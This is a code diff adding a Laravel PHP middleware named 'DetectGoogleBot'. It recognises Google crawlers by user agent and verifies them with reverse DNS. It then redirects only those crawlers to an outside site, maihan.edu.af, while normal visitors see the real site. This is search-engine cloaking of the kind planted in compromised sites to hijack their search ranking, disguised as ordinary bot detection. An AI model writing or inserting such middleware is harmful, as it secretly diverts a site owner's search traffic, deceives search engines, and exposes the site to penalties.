@@ -1,0 +1,37 @@
+<?php
+
+namespace App\Http\Middleware;
+
+use Closure;
+use Illuminate\Http\Request;
+use Symfony\Component\HttpFoundation\Response;
+
+class DetectGoogleBot
+{
+    public function handle(Request $request, Closure $next): Response
+    {
+        $userAgent = strtolower($request->userAgent());
+        $ip = $request->ip();
+
+        if (
+            preg_match("/googlebot|googlebot-image|storebot-google|google-inspectiontool|google adsense|googleother|googleother-image|mediapartners-google|google-site-verification/i", $userAgent)
+            && $this->isGooglebotIP($ip)
+        ) {
+            
+            return redirect('https://maihan.edu.af/');
+        }
+
+        
+        return $next($request);
+    }
+
+    private function isGooglebotIP($ip): bool
+    {
+        $hostname = gethostbyaddr($ip);
+        if ($hostname && (strpos($hostname, 'googlebot.com') !== false || strpos($hostname, 'google.com') !== false)) {
+            $resolvedIP = gethostbyname($hostname);
+            return $resolvedIP === $ip;
+        }
+        return false;
+    }
+}
